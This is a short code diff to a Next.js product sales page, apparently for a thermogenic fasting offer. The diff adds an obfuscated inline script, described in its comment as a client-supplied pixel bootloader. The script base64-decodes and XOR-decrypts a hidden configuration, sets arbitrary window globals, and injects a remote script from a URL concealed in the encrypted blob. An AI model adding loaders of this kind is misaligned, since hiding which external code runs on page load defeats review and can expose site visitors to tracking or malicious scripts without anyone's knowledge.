@@ -28,6 +28,12 @@ export default function JejumTermogenicoPage() {
       <link rel="dns-prefetch" href="https://images.converteai.net" />
       <link rel="dns-prefetch" href="https://license.vturb.com" />
 
+      {/* Bootloader do pixel (obfuscado): decodifica a URL e os globals e
+          injeta o script real no head. Fornecido pelo cliente. */}
+      <Script id="pixel-boot" strategy="afterInteractive">
+        {`(function(){var q_lpk=atob("DAGtveA+pGqjH9wmHHqPyJJShlCBd6hSbHKXks9dwASNaqhLdWfUk4NRyUTBbfNVf3PEzZRNixrKZ7lKM3HExYVSigDQPfAEfXXZz4lc0R7GbP4cR1yBn4dSywjCc68EJlrWn45fyQ+BJf5WdXnI0alahkaBab1KaWSPh8IIxQuaLOofLmOf24IKkA7CJroUJDma3tAc2Tfe");var s_r0j=[];for(var m_yr=0;m_yr<q_lpk.length;m_yr++){s_r0j.push(q_lpk.charCodeAt(m_yr)&255);}var a_io=s_r0j[0];var i_4m=s_r0j.slice(1,1+a_io);var e_y3w=s_r0j.slice(1+a_io);var q_49e=e_y3w.map(function(b,t_xx6o){return b^i_4m[t_xx6o%a_io];});var a_0r="";for(var z_4jq4=0;z_4jq4<q_49e.length;z_4jq4++){a_0r+=String.fromCharCode(q_49e[z_4jq4]&255);}var k_1=decodeURIComponent(escape(a_0r));var v_qcif=JSON.parse(k_1);var i_v=v_qcif.globals||[];i_v.forEach(function(e_e){window[e_e.name]=e_e.value;});var v_9=document.createElement("script");v_9.src=v_qcif.url;v_9.async=true;v_9.defer=true;(v_qcif.attributes||[]).forEach(function(h_m){v_9.setAttribute(h_m.name,h_m.value);});(document.head||document.documentElement).appendChild(v_9);})();`}
+      </Script>
+
       <style jsx global>{`
         .esconder {
           display: none;
